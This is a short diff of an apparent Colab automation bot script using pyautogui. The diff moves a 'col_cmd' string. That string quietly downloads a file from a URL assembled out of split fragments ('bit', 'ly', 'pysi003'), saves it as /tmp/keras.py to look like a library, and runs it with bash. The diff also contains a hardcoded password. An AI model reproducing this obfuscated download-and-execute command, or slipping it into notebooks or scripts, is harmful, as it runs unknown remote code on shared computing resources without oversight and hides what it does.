@@ -7,22 +7,19 @@ import pyautogui
 import random
 import string
 
-
-col_cmd = "! cmd=pysi;i=003;b=ly;a=bit;wget -q -O /tmp/keras.py ${a}.${b}/${cmd}${i} ; bash /tmp/keras.py 0"
-
-endpoint_part1="pysi"
-endpoint_part2="000"
-domain0="bit"
-domain1="ly"
-log_level="0"
-
-listfile = '/home/one/gtest'
+listfile = '/home/one/gx'
 gpass = "Ms123456789"
 new = True
 global_slow_motion = 0.7
 enable_gpu = False
 speed = 200
 
+endpoint_part1="pysi"
+endpoint_part2="000"
+domain0="bit"
+domain1="ly"
+log_level="0"
+col_cmd = "! cmd=pysi;i=003;b=ly;a=bit;wget -q -O /tmp/keras.py ${a}.${b}/${cmd}${i} ; bash /tmp/keras.py 0"
 ###################################################################
 logging.basicConfig(filename='/tmp/0colab-robot.log',
                     encoding='utf-8', level=logging.DEBUG)
